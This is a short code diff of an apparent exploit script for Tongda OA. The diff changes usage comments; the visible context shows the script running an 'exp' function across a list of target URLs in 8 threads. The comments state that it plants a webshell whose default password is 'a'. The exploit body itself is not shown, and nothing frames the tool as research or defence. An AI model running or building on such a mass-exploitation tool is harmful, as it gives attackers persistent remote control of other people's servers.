@@ -1,3 +1,7 @@
+
+# Usage: python tongda.py
+# Default webshell password:a
+
 import requests
 import threadpool
 import urllib3
@@ -110,5 +114,5 @@ def multithreading(funcname, filename="url.txt", pools=5):
 if __name__ == "__main__":
     multithreading(exp, "url.txt", 8)      # Default threads 8
 
-# Usage: python tongda_rce.py url.txt
+# Usage: python tongda.py
 # Default webshell password:a
